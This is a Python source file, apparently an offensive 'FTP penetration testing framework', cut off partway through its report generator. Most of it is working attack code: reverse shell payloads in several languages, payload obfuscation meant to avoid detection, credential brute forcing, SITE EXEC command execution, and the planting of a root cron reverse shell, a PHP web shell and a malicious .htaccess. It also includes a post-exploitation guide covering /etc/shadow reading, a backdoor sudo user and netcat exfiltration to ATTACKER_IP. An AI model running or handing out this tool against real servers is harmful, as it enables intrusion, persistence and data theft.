#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════════

        FTP Advanced Penetration Testing Framework 

═══════════════════════════════════════════════════════════════════════════════
"""

import os
import sys
import time
import socket
import random
import string
import base64
import hashlib
import argparse
import logging
import threading
import subprocess
import signal
from datetime import datetime
from ftplib import FTP, error_perm, error_reply, error_temp
from typing import List, Dict, Tuple, Optional
import json
import re

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION & CONSTANTS
# ═══════════════════════════════════════════════════════════════════════════════

VERSION = "3.0"
BANNER = f"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║   ███████╗████████╗██████╗     ██████╗ ███████╗███╗   ██╗████████╗      ║
║   ██╔════╝╚══██╔══╝██╔══██╗    ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝      ║
║   █████╗     ██║   ██████╔╝    ██████╔╝█████╗  ██╔██╗ ██║   ██║         ║
║   ██╔══╝     ██║   ██╔═══╝     ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║         ║
║   ██║        ██║   ██║         ██║     ███████╗██║ ╚████║   ██║         ║
║   ╚═╝        ╚═╝   ╚═╝         ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝         ║
║                                                                           ║
║              Advanced FTP Penetration Testing Framework v{VERSION}            ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

# Common web server directories
WEB_DIRECTORIES = [
    "/var/www/html", "/var/www", "/srv/www", "/srv/http",
    "/usr/local/apache2/htdocs", "/opt/lampp/htdocs",
    "/usr/share/nginx/html", "/home/*/public_html",
    "/var/www/*/htdocs", "/usr/local/www/apache24/data",
    "/www", "/wwwroot", "/htdocs", "/public_html"
]

# Writable directories to check
WRITABLE_DIRS = [
    "/tmp", "/var/tmp", "/dev/shm", "/var/lib/php/sessions",
    "/var/lib/php5", "/var/spool/cron", "/var/spool/cron/crontabs"
]

# Common FTP credentials
DEFAULT_CREDENTIALS = [
    ("anonymous", "anonymous"), ("anonymous", ""), ("anonymous", "guest"),
    ("ftp", "ftp"), ("admin", "admin"), ("admin", "password"),
    ("root", "root"), ("root", "toor"), ("user", "user"),
    ("test", "test"), ("guest", "guest")
]

# Reverse shell payloads
SHELL_PAYLOADS = {
    "bash": 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
    "python": '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'''',
    "php": '''<?php set_time_limit(0);$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");?>''',
    "perl": '''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' ''',
    "ruby": '''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
    "nc": '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f''',
    "nc_openbsd": '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f''',
}

# Post-exploitation commands
POST_EXPLOIT_COMMANDS = [
    "whoami", "id", "uname -a", "hostname", "cat /etc/passwd",
    "cat /etc/shadow 2>/dev/null", "sudo -l", "find / -perm -4000 2>/dev/null",
    "cat /etc/crontab", "ls -la /home/", "netstat -tulnp", "ps aux"
]

# ═══════════════════════════════════════════════════════════════════════════════
# LOGGING SETUP
# ═══════════════════════════════════════════════════════════════════════════════

class ColoredFormatter(logging.Formatter):
    """Custom formatter with colors"""
    
    COLORS = {
        'DEBUG': '\033[36m',    # Cyan
        'INFO': '\033[32m',     # Green
        'WARNING': '\033[33m',  # Yellow
        'ERROR': '\033[31m',    # Red
        'CRITICAL': '\033[35m', # Magenta
    }
    RESET = '\033[0m'
    
    def format(self, record):
        log_color = self.COLORS.get(record.levelname, self.RESET)
        record.levelname = f"{log_color}{record.levelname}{self.RESET}"
        return super().format(record)

def setup_logging(verbose: bool = False):
    """Setup logging configuration"""
    log_level = logging.DEBUG if verbose else logging.INFO
    
    # Console handler
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(log_level)
    console_formatter = ColoredFormatter(
        '%(levelname)s - %(message)s'
    )
    console_handler.setFormatter(console_formatter)
    
    # File handler
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = f"ftp_pentest_{timestamp}.log"
    file_handler = logging.FileHandler(log_file)
    file_handler.setLevel(logging.DEBUG)
    file_formatter = logging.Formatter(
        '%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    file_handler.setFormatter(file_formatter)
    
    # Root logger
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG)
    logger.addHandler(console_handler)
    logger.addHandler(file_handler)
    
    return log_file

# ═══════════════════════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

def generate_random_string(length: int = 8, include_digits: bool = True) -> str:
    """Generate random alphanumeric string"""
    chars = string.ascii_letters
    if include_digits:
        chars += string.digits
    return ''.join(random.choices(chars, k=length))

def obfuscate_payload(payload: str, method: str = "base64") -> str:
    """Obfuscate payload to avoid detection"""
    if method == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif method == "hex":
        return payload.encode().hex()
    elif method == "url":
        return ''.join(f'%{ord(c):02x}' for c in payload)
    return payload

def deobfuscate_command(encoded: str, method: str = "base64") -> str:
    """Create deobfuscation wrapper"""
    if method == "base64":
        return f"echo {encoded} | base64 -d | bash"
    elif method == "hex":
        return f"echo {encoded} | xxd -r -p | bash"
    return encoded

def check_port_open(host: str, port: int, timeout: int = 3) -> bool:
    """Check if port is open"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

# ═══════════════════════════════════════════════════════════════════════════════
# FTP CONNECTION MANAGER
# ═══════════════════════════════════════════════════════════════════════════════

class FTPConnectionManager:
    """Manages FTP connections with retry logic"""
    
    def __init__(self, host: str, port: int = 21, timeout: int = 10):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.ftp = None
        self.authenticated = False
        self.username = None
        self.password = None
        
    def connect(self, username: str = "anonymous", password: str = "anonymous", 
                max_retries: int = 3) -> bool:
        """Connect to FTP server with retry logic"""
        for attempt in range(max_retries):
            try:
                logging.info(f"[Attempt {attempt + 1}/{max_retries}] Connecting to {self.host}:{self.port}")
                self.ftp = FTP()
                self.ftp.connect(self.host, self.port, timeout=self.timeout)
                
                logging.debug(f"Server banner: {self.ftp.getwelcome()}")
                
                self.ftp.login(username, password)
                self.authenticated = True
                self.username = username
                self.password = password
                
                logging.info(f"✓ Successfully authenticated as '{username}'")
                logging.debug(f"Current directory: {self.ftp.pwd()}")
                
                return True
                
            except error_perm as e:
                logging.error(f"✗ Authentication failed: {e}")
                return False
                
            except (socket.timeout, socket.error, error_temp) as e:
                logging.warning(f"Connection error: {e}")
                if attempt < max_retries - 1:
                    wait_time = (attempt + 1) * 2
                    logging.info(f"Retrying in {wait_time} seconds...")
                    time.sleep(wait_time)
                else:
                    logging.error("Max retries reached")
                    return False
                    
            except Exception as e:
                logging.error(f"Unexpected error: {e}")
                return False
                
        return False
    
    def disconnect(self):
        """Safely disconnect from FTP server"""
        if self.ftp:
            try:
                self.ftp.quit()
                logging.debug("FTP connection closed gracefully")
            except:
                try:
                    self.ftp.close()
                    logging.debug("FTP connection forced close")
                except:
                    pass
    
    def is_connected(self) -> bool:
        """Check if still connected"""
        if not self.ftp:
            return False
        try:
            self.ftp.voidcmd("NOOP")
            return True
        except:
            return False

# ═══════════════════════════════════════════════════════════════════════════════
# VULNERABILITY SCANNER
# ═══════════════════════════════════════════════════════════════════════════════

class FTPVulnerabilityScanner:
    """Scans for various FTP vulnerabilities"""
    
    def __init__(self, ftp_manager: FTPConnectionManager):
        self.ftp = ftp_manager.ftp
        self.host = ftp_manager.host
        self.vulnerabilities = []
        
    def scan_all(self) -> List[Dict]:
        """Run all vulnerability checks"""
        logging.info("="*70)
        logging.info("Starting comprehensive vulnerability scan...")
        logging.info("="*70)
        
        checks = [
            ("Anonymous Login", self.check_anonymous_access),
            ("SITE EXEC Command", self.check_site_exec),
            ("SITE CHMOD Command", self.check_site_chmod),
            ("Writable Directories", self.check_writable_directories),
            ("Directory Traversal", self.check_directory_traversal),
            ("Bounce Attack", self.check_bounce_attack),
            ("ASCII Art Injection", self.check_ascii_injection),
            ("Buffer Overflow", self.check_buffer_overflow),
        ]
        
        for check_name, check_func in checks:
            logging.info(f"\n[*] Checking: {check_name}")
            try:
                check_func()
            except Exception as e:
                logging.error(f"Error during {check_name}: {e}")
        
        logging.info("\n" + "="*70)
        logging.info(f"Vulnerability scan completed. Found {len(self.vulnerabilities)} issues")
        logging.info("="*70)
        
        return self.vulnerabilities
    
    def check_anonymous_access(self):
        """Check if anonymous access is enabled"""
        try:
            test_ftp = FTP(self.host)
            test_ftp.login("anonymous", "anonymous")
            test_ftp.quit()
            
            vuln = {
                "name": "Anonymous FTP Access",
                "severity": "MEDIUM",
                "description": "Anonymous authentication is enabled",
                "recommendation": "Disable anonymous access unless required"
            }
            self.vulnerabilities.append(vuln)
            logging.warning("✗ VULNERABLE: Anonymous access enabled")
            
        except:
            logging.info("✓ Anonymous access disabled")
    
    def check_site_exec(self):
        """Check for SITE EXEC vulnerability"""
        dangerous_commands = [
            "SITE EXEC id",
            "SITE EXEC whoami",
            "SITE EXEC uname",
            "SITE EXEC ls"
        ]
        
        for cmd in dangerous_commands:
            try:
                response = self.ftp.sendcmd(cmd)
                vuln = {
                    "name": "SITE EXEC Command Injection",
                    "severity": "CRITICAL",
                    "description": f"Server executes system commands: {cmd}",
                    "response": response,
                    "recommendation": "Disable SITE EXEC command immediately"
                }
                self.vulnerabilities.append(vuln)
                logging.critical(f"✗ CRITICAL: SITE EXEC vulnerable - {cmd}")
                return
            except:
                pass
        
        logging.info("✓ SITE EXEC not available")
    
    def check_site_chmod(self):
        """Check for SITE CHMOD vulnerability"""
        test_file = f"test_{generate_random_string(6)}.txt"
        
        try:
            # Try to create and chmod a file
            with open(test_file, "w") as f:
                f.write("test")
            
            self.ftp.storbinary(f"STOR {test_file}", open(test_file, "rb"))
            response = self.ftp.sendcmd(f"SITE CHMOD 777 {test_file}")
            
            vuln = {
                "name": "SITE CHMOD Available",
                "severity": "MEDIUM",
                "description": "Server allows permission modification via SITE CHMOD",
                "recommendation": "Restrict SITE CHMOD usage"
            }
            self.vulnerabilities.append(vuln)
            logging.warning("✗ VULNERABLE: SITE CHMOD available")
            
            # Cleanup
            try:
                self.ftp.delete(test_file)
                os.remove(test_file)
            except:
                pass
                
        except:
            logging.info("✓ SITE CHMOD not available")
    
    def check_writable_directories(self):
        """Find writable directories"""
        writable_dirs = []
        test_file = f"test_{generate_random_string(6)}.tmp"
        
        directories_to_check = ["/"] + WEB_DIRECTORIES + WRITABLE_DIRS
        
        for directory in directories_to_check:
            try:
                original_dir = self.ftp.pwd()
                self.ftp.cwd(directory)
                
                # Try to upload a test file
                with open(test_file, "w") as f:
                    f.write("test")
                
                self.ftp.storbinary(f"STOR {test_file}", open(test_file, "rb"))
                self.ftp.delete(test_file)
                
                writable_dirs.append(directory)
                logging.warning(f"✗ Writable directory found: {directory}")
                
                self.ftp.cwd(original_dir)
                
            except:
                pass
        
        if writable_dirs:
            vuln = {
                "name": "Writable Directories",
                "severity": "HIGH",
                "description": f"Found {len(writable_dirs)} writable directories",
                "directories": writable_dirs,
                "recommendation": "Restrict write permissions to necessary directories only"
            }
            self.vulnerabilities.append(vuln)
        else:
            logging.info("✓ No easily writable directories found")
        
        # Cleanup
        try:
            if os.path.exists(test_file):
                os.remove(test_file)
        except:
            pass
    
    def check_directory_traversal(self):
        """Check for directory traversal vulnerability"""
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for attempt in traversal_attempts:
            try:
                self.ftp.retrlines(f"RETR {attempt}", lambda x: None)
                vuln = {
                    "name": "Directory Traversal",
                    "severity": "CRITICAL",
                    "description": f"Server vulnerable to path traversal: {attempt}",
                    "recommendation": "Implement proper input validation and path sanitization"
                }
                self.vulnerabilities.append(vuln)
                logging.critical(f"✗ CRITICAL: Directory traversal vulnerable")
                return
            except:
                pass
        
        logging.info("✓ No directory traversal vulnerability detected")
    
    def check_bounce_attack(self):
        """Check for FTP bounce attack vulnerability"""
        try:
            # Try to use PORT command to connect to arbitrary host
            self.ftp.sendcmd("PORT 127,0,0,1,0,80")
            vuln = {
                "name": "FTP Bounce Attack",
                "severity": "HIGH",
                "description": "Server may be vulnerable to FTP bounce attacks",
                "recommendation": "Disable PORT command or implement strict validation"
            }
            self.vulnerabilities.append(vuln)
            logging.warning("✗ Potential FTP bounce vulnerability")
        except:
            logging.info("✓ FTP bounce attack mitigated")
    
    def check_ascii_injection(self):
        """Check for ASCII injection vulnerabilities"""
        try:
            malicious_dir = "test\x00hidden"
            self.ftp.mkd(malicious_dir)
            vuln = {
                "name": "ASCII Injection",
                "severity": "MEDIUM",
                "description": "Server accepts null bytes in directory names",
                "recommendation": "Sanitize input to remove control characters"
            }
            self.vulnerabilities.append(vuln)
            logging.warning("✗ ASCII injection possible")
            
            # Cleanup
            try:
                self.ftp.rmd(malicious_dir)
            except:
                pass
        except:
            logging.info("✓ ASCII injection mitigated")
    
    def check_buffer_overflow(self):
        """Check for buffer overflow vulnerabilities"""
        try:
            # Try extremely long username
            long_string = "A" * 10000
            test_ftp = FTP(self.host)
            test_ftp.sendcmd(f"USER {long_string}")
            test_ftp.quit()
            
            logging.warning("✗ Server accepted abnormally long input - potential buffer overflow")
        except:
            logging.info("✓ No obvious buffer overflow vulnerability")

# ═══════════════════════════════════════════════════════════════════════════════
# CREDENTIAL BRUTE FORCER
# ═══════════════════════════════════════════════════════════════════════════════

class FTPBruteForcer:
    """Brute force FTP credentials"""
    
    def __init__(self, host: str, port: int = 21):
        self.host = host
        self.port = port
        self.found_credentials = []
        
    def brute_force(self, usernames: List[str] = None, passwords: List[str] = None,
                   use_defaults: bool = True, max_attempts: int = 100) -> List[Tuple[str, str]]:
        """Brute force FTP credentials"""
        
        logging.info("="*70)
        logging.info("Starting credential brute force attack...")
        logging.info("="*70)
        
        credentials_to_try = []
        
        if use_defaults:
            credentials_to_try.extend(DEFAULT_CREDENTIALS)
        
        if usernames and passwords:
            for user in usernames:
                for pwd in passwords:
                    credentials_to_try.append((user, pwd))
        
        # Limit attempts
        credentials_to_try = credentials_to_try[:max_attempts]
        
        total = len(credentials_to_try)
        logging.info(f"Testing {total} credential combinations...")
        
        for idx, (username, password) in enumerate(credentials_to_try, 1):
            try:
                logging.debug(f"[{idx}/{total}] Trying {username}:{password}")
                
                ftp = FTP()
                ftp.connect(self.host, self.port, timeout=5)
                ftp.login(username, password)
                ftp.quit()
                
                self.found_credentials.append((username, password))
                logging.info(f"✓ FOUND: {username}:{password}")
                
                # Small delay to avoid detection
                time.sleep(0.5)
                
            except error_perm:
                # Authentication failed, continue
                pass
            except Exception as e:
                logging.debug(f"Error: {e}")
            
            # Progress indicator
            if idx % 10 == 0:
                logging.info(f"Progress: {idx}/{total} ({idx*100//total}%)")
        
        logging.info("="*70)
        logging.info(f"Brute force completed. Found {len(self.found_credentials)} valid credentials")
        logging.info("="*70)
        
        return self.found_credentials

# ═══════════════════════════════════════════════════════════════════════════════
# EXPLOIT EXECUTOR
# ═══════════════════════════════════════════════════════════════════════════════

class FTPExploitExecutor:
    """Executes various exploit techniques"""
    
    def __init__(self, ftp_manager: FTPConnectionManager, reverse_ip: str, reverse_port: int):
        self.ftp_manager = ftp_manager
        self.ftp = ftp_manager.ftp
        self.reverse_ip = reverse_ip
        self.reverse_port = reverse_port
        self.exploits_tried = []
        
    def execute_all_exploits(self) -> bool:
        """Try all available exploits"""
        logging.info("="*70)
        logging.info("Starting exploitation phase...")
        logging.info("="*70)
        
        exploits = [
            ("SITE EXEC Direct", self.exploit_site_exec_direct),
            ("SITE EXEC with Obfuscation", self.exploit_site_exec_obfuscated),
            ("Shell Upload & Execute", self.exploit_shell_upload),
            ("Cron Job Injection", self.exploit_cron_injection),
            ("Web Shell Upload", self.exploit_web_shell),
            (".htaccess Manipulation", self.exploit_htaccess),
            ("PHP Wrapper Exploit", self.exploit_php_wrapper),
        ]
        
        for exploit_name, exploit_func in exploits:
            logging.info(f"\n[*] Trying: {exploit_name}")
            try:
                if exploit_func():
                    logging.info(f"✓ SUCCESS: {exploit_name} worked!")
                    return True
                else:
                    logging.info(f"✗ FAILED: {exploit_name} did not work")
            except Exception as e:
                logging.error(f"✗ ERROR in {exploit_name}: {e}")
        
        logging.warning("All exploitation attempts failed")
        return False
    
    def exploit_site_exec_direct(self) -> bool:
        """Direct SITE EXEC exploitation"""
        payloads = []
        
        for shell_type, template in SHELL_PAYLOADS.items():
            if shell_type in ["bash", "python", "perl", "ruby", "nc"]:
                payload = template.format(ip=self.reverse_ip, port=self.reverse_port)
                payloads.append((shell_type, payload))
        
        for shell_type, payload in payloads:
            try:
                logging.debug(f"Trying {shell_type} shell...")
                self.ftp.sendcmd(f"SITE EXEC {payload}")
                self.exploits_tried.append(("SITE EXEC", shell_type, payload))
                return True
            except:
                pass
        
        return False
    
    def exploit_site_exec_obfuscated(self) -> bool:
        """SITE EXEC with payload obfuscation"""
        base_payload = SHELL_PAYLOADS["bash"].format(
            ip=self.reverse_ip, 
            port=self.reverse_port
        )
        
        obfuscation_methods = ["base64", "hex"]
        
        for method in obfuscation_methods:
            try:
                encoded = obfuscate_payload(base_payload, method)
                deobfuscated_cmd = deobfuscate_command(encoded, method)
                
                logging.debug(f"Trying {method} obfuscation...")
                self.ftp.sendcmd(f"SITE EXEC {deobfuscated_cmd}")
                self.exploits_tried.append(("SITE EXEC Obfuscated", method, deobfuscated_cmd))
                return True
            except:
                pass
        
        return False
    
    def exploit_shell_upload(self) -> bool:
        """Upload and execute reverse shell"""
        writable_dirs = self._find_writable_dirs()
        
        if not writable_dirs:
            logging.warning("No writable directories found")
            return False
        
        for directory in writable_dirs:
            for shell_type, template in SHELL_PAYLOADS.items():
                if shell_type not in ["bash", "python", "perl"]:
                    continue
                
                try:
                    shell_name = f".{generate_random_string(8)}.sh"
                    shell_content = template.format(ip=self.reverse_ip, port=self.reverse_port)
                    
                    # Create shell file
                    with open(shell_name, "w") as f:
                        f.write(f"#!/bin/bash\n{shell_content}")
                    
                    # Upload
                    original_dir = self.ftp.pwd()
                    self.ftp.cwd(directory)
                    
                    with open(shell_name, "rb") as f:
                        self.ftp.storbinary(f"STOR {shell_name}", f)
                    
                    # Try to make executable and run
                    try:
                        self.ftp.sendcmd(f"SITE CHMOD 777 {shell_name}")
                        self.ftp.sendcmd(f"SITE EXEC bash {directory}/{shell_name}")
                        
                        self.exploits_tried.append(("Shell Upload", shell_type, f"{directory}/{shell_name}"))
                        
                        # Cleanup
                        os.remove(shell_name)
                        return True
                    except:
                        pass
                    
                    self.ftp.cwd(original_dir)
                    os.remove(shell_name)
                    
                except Exception as e:
                    logging.debug(f"Shell upload failed: {e}")
        
        return False
    
    def exploit_cron_injection(self) -> bool:
        """Inject malicious cron job"""
        cron_locations = [
            "/var/spool/cron/crontabs/root",
            "/var/spool/cron/root",
            "/etc/crontab",
            "/etc/cron.d/malicious"
        ]
        
        cron_payload = f"* * * * * root bash -c 'bash -i >& /dev/tcp/{self.reverse_ip}/{self.reverse_port} 0>&1'\n"
        
        for cron_path in cron_locations:
            try:
                cron_file = f"cron_{generate_random_string(6)}"
                with open(cron_file, "w") as f:
                    f.write(cron_payload)
                
                with open(cron_file, "rb") as f:
                    self.ftp.storbinary(f"STOR {cron_path}", f)
                
                logging.info(f"✓ Cron job injected: {cron_path}")
                os.remove(cron_file)
                
                self.exploits_tried.append(("Cron Injection", cron_path, cron_payload))
                return True
                
            except:
                pass
        
        return False
    
    def exploit_web_shell(self) -> bool:
        """Upload web shell"""
        web_dirs = [d for d in WEB_DIRECTORIES]
        
        php_shell = f"""<?php
system($_GET['cmd']);
?>"""
        
        for web_dir in web_dirs:
            try:
                shell_name = f"{generate_random_string(10)}.php"
                
                # Try to upload
                original_dir = self.ftp.pwd()
                self.ftp.cwd(web_dir)
                
                with open(shell_name, "w") as f:
                    f.write(php_shell)
                
                with open(shell_name, "rb") as f:
                    self.ftp.storbinary(f"STOR {shell_name}", f)
                
                web_url = f"http://{self.ftp_manager.host}/{shell_name}"
                logging.info(f"✓ Web shell uploaded: {web_url}")
                logging.info(f"   Access via: {web_url}?cmd=whoami")
                
                os.remove(shell_name)
                self.ftp.cwd(original_dir)
                
                self.exploits_tried.append(("Web Shell", web_url, php_shell))
                return True
                
            except:
                pass
        
        return False
    
    def exploit_htaccess(self) -> bool:
        """Upload malicious .htaccess"""
        htaccess_content = """
AddType application/x-httpd-php .jpg .png .gif
php_flag engine on
"""
        
        web_dirs = WEB_DIRECTORIES
        
        for web_dir in web_dirs:
            try:
                original_dir = self.ftp.pwd()
                self.ftp.cwd(web_dir)
                
                with open(".htaccess", "w") as f:
                    f.write(htaccess_content)
                
                with open(".htaccess", "rb") as f:
                    self.ftp.storbinary("STOR .htaccess", f)
                
                logging.info(f"✓ .htaccess uploaded to {web_dir}")
                os.remove(".htaccess")
                self.ftp.cwd(original_dir)
                
                self.exploits_tried.append((".htaccess", web_dir, htaccess_content))
                return True
                
            except:
                pass
        
        return False
    
    def exploit_php_wrapper(self) -> bool:
        """Use PHP wrappers for exploitation"""
        php_wrappers = [
            f"php://filter/convert.base64-encode/resource=/etc/passwd",
            f"expect://id",
            f"data://text/plain;base64,{base64.b64encode(b'<?php system($_GET[cmd]); ?>').decode()}"
        ]
        
        for wrapper in php_wrappers:
            try:
                self.ftp.retrlines(f"RETR {wrapper}", lambda x: logging.info(f"Response: {x}"))
                logging.info(f"✓ PHP wrapper successful: {wrapper}")
                return True
            except:
                pass
        
        return False
    
    def _find_writable_dirs(self) -> List[str]:
        """Find writable directories"""
        writable = []
        test_file = f"test_{generate_random_string(6)}.tmp"
        
        dirs_to_check = ["/tmp", "/var/tmp"] + WEB_DIRECTORIES
        
        for directory in dirs_to_check:
            try:
                original = self.ftp.pwd()
                self.ftp.cwd(directory)
                
                with open(test_file, "w") as f:
                    f.write("test")
                
                with open(test_file, "rb") as f:
                    self.ftp.storbinary(f"STOR {test_file}", f)
                
                self.ftp.delete(test_file)
                writable.append(directory)
                
                self.ftp.cwd(original)
                
            except:
                pass
        
        if os.path.exists(test_file):
            os.remove(test_file)
        
        return writable

# ═══════════════════════════════════════════════════════════════════════════════
# LISTENER MANAGER
# ═══════════════════════════════════════════════════════════════════════════════

class ListenerManager:
    """Manages reverse shell listeners"""
    
    def __init__(self, port: int):
        self.port = port
        self.listener_process = None
        
    def start_listener(self, method: str = "gnome-terminal"):
        """Start a netcat listener"""
        logging.info(f"Starting listener on port {self.port}...")
        
        nc_command = f"nc -lvnp {self.port}"
        
        try:
            if method == "gnome-terminal":
                cmd = f"gnome-terminal -- bash -c '{nc_command}; echo Press Enter to exit...; read'"
                self.listener_process = subprocess.Popen(cmd, shell=True)
                
            elif method == "xterm":
                cmd = f"xterm -e '{nc_command}'"
                self.listener_process = subprocess.Popen(cmd, shell=True)
                
            elif method == "tmux":
                cmd = f"tmux new-window '{nc_command}'"
                self.listener_process = subprocess.Popen(cmd, shell=True)
                
            else:  # background
                self.listener_process = subprocess.Popen(
                    nc_command.split(),
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
            
            logging.info("✓ Listener started successfully")
            time.sleep(2)
            
        except Exception as e:
            logging.error(f"Failed to start listener: {e}")
            logging.info(f"Please manually run: {nc_command}")
    
    def stop_listener(self):
        """Stop the listener"""
        if self.listener_process:
            try:
                self.listener_process.terminate()
                logging.info("Listener stopped")
            except:
                pass

# ═══════════════════════════════════════════════════════════════════════════════
# POST-EXPLOITATION MODULE
# ═══════════════════════════════════════════════════════════════════════════════

class PostExploitationModule:
    """Post-exploitation guidance and automation"""
    
    @staticmethod
    def generate_post_exploit_guide(target_host: str, shell_type: str = "bash"):
        """Generate comprehensive post-exploitation guide"""
        
        guide = f"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                     POST-EXPLOITATION GUIDE                                ║
║                Target: {target_host:48} ║
╚═══════════════════════════════════════════════════════════════════════════╝

[1] STABILIZE YOUR SHELL:
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    Ctrl+Z
    stty raw -echo; fg
    reset

[2] BASIC RECONNAISSANCE:
    whoami && id
    uname -a
    hostname
    cat /etc/issue
    cat /etc/*-release

[3] USER ENUMERATION:
    cat /etc/passwd | grep -v nologin
    ls -la /home/
    cat /etc/shadow 2>/dev/null
    last -a

[4] NETWORK INFORMATION:
    ip a
    netstat -tulnp
    ss -tulnp
    arp -a

[5] PRIVILEGE ESCALATION - SUID/SGID:
    find / -perm -4000 -type f 2>/dev/null
    find / -perm -2000 -type f 2>/dev/null
    
    # Check GTFOBins for exploitable binaries:
    # https://gtfobins.github.io/

[6] SUDO PRIVILEGES:
    sudo -l
    
    # Common sudo exploits:
    # - (ALL) NOPASSWD: ALL
    # - (ALL) NOPASSWD: /bin/bash
    # - sudo -u#-1 /bin/bash

[7] CRON JOBS:
    cat /etc/crontab
    ls -la /etc/cron.*
    ls -la /var/spool/cron/crontabs/

[8] WRITABLE FILES & DIRECTORIES:
    find / -writable -type d 2>/dev/null | grep -v proc
    find / -writable -type f 2>/dev/null | grep -v proc

[9] CAPABILITIES:
    getcap -r / 2>/dev/null

[10] KERNEL EXPLOITS:
    searchsploit kernel $(uname -r)
    
    # Download LinPEAS:
    wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh

[11] PASSWORD HUNTING:
    grep -r "password" /etc/ 2>/dev/null
    grep -r "password" /var/www/ 2>/dev/null
    find / -name "*.conf" -exec grep -i "password" {{}} \\; 2>/dev/null
    find / -name "config.php" 2>/dev/null
    find / -name "wp-config.php" 2>/dev/null

[12] SSH KEYS:
    find / -name "id_rsa" 2>/dev/null
    find / -name "id_dsa" 2>/dev/null
    find / -name "authorized_keys" 2>/dev/null

[13] DOCKER ESCAPE (if in container):
    fdisk -l
    lsblk
    mount
    # Check for Docker socket:
    ls -la /var/run/docker.sock

[14] PERSISTENCE:
    # Add SSH key:
    echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
    
    # Add backdoor user:
    useradd -m -s /bin/bash backdoor
    echo "backdoor:password" | chpasswd
    usermod -aG sudo backdoor

[15] DATA EXFILTRATION:
    # Setup HTTP server:
    python3 -m http.server 8000
    
    # Transfer files:
    nc -lvnp 9999 > file.txt  # On attacker
    nc ATTACKER_IP 9999 < file.txt  # On target

╔═══════════════════════════════════════════════════════════════════════════╗
║ AUTOMATED PRIVILEGE ESCALATION TOOLS:                                     ║
╠═══════════════════════════════════════════════════════════════════════════╣
║ LinPEAS:   curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh ║
║ LinEnum:   curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh       ║
║ LSE:       curl -L https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh | sh ║
║ Pspy:      wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64                ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""
        
        logging.info(guide)
        
        # Save to file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        guide_file = f"post_exploit_guide_{timestamp}.txt"
        with open(guide_file, "w") as f:
            f.write(guide)
        
        logging.info(f"\n✓ Post-exploitation guide saved to: {guide_file}")

# ═══════════════════════════════════════════════════════════════════════════════
# REPORT GENERATOR
# ═══════════════════════════════════════════════════════════════════════════════

class ReportGenerator:
    """Generate comprehensive penetration test reports"""
    
    def __init__(self, target_host: str):
        self.target_host = target_host
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
    def generate_report(self, vulnerabilities: List[Dict], 
                       credentials: List[Tuple[str, str]],
                       exploits: List[Tuple[str, str, str]]) -> str:
        """Generate comprehensive report"""
        
        report = f"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║                  FTP PENETRATION TEST REPORT                              ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝

Target Information:
────────────────────────────────────────────────────────────────────────────
  Host: {self.target_host}
  Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
  Tester: FTP PenTest Framework v{VERSION}

Executive Summary:
────────────────────────────────────────────────────────────────────────────
  Total Vulnerabilities: {len(vulnerabilities)}
  Valid Credentials Found: {len(credentials)}
  Successful Exploits: {len(exploits)}
  
  Risk Level: {"CRITICAL" if any(v.get("severity") == "CRITICAL" for v in vulnerabilities) else "HIGH" if vulnerabilities else "LOW"}

Discovered Credentials:
────────────────────────────────────────────────────────────────────────────
"""
        
        if credentials:
            for username, password in credentials:
                report += f"  ✓ {username}:{password}\n"
        else:
            report += "  (None found)\n"
        
